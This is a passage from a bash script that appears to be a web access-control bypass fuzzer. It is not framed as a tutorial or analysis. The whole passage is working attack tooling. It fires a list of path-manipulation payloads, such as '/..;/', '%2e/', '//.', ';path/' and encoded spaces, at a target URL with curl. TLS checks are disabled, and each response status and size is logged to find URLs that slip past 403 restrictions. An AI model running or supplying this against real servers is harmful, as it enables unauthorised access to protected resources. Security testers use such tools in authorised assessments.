code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1.html" -H "$user_agent")
print
echo -n "Payload [ %20/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%20/" -H "$user_agent")
print
echo -n "Payload [ %20$path%20/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$target/%20$path%20/" -H "$user_agent")
print
echo -n "Payload [ .json ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1.json" -H "$user_agent")
print
echo -n "Payload [ \..\.\ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1\..\.\\" -H "$user_agent")
print
echo -n "Payload [ /* ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/*" -H "$user_agent")
print
echo -n "Payload [ ./. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1./." -H "$user_agent")
print
echo -n "Payload [ /*/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/*/" -H "$user_agent")
print
echo -n "Payload [ /..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;/" -H "$user_agent")
print
echo -n "Payload [%2e/$path ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$target/%2e/$path" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2e/" -H "$user_agent")
print
echo -n "Payload [ //. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1//." -H "$user_agent")
print
echo -n "Payload [ //// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1////" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../" -H "$user_agent")
print
echo -n "Payload [ ;$path/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$target/;$path/" -H "$user_agent")
print

echo "All done, scan results in $outdir"
wc "$outdir"/* | sort -uV
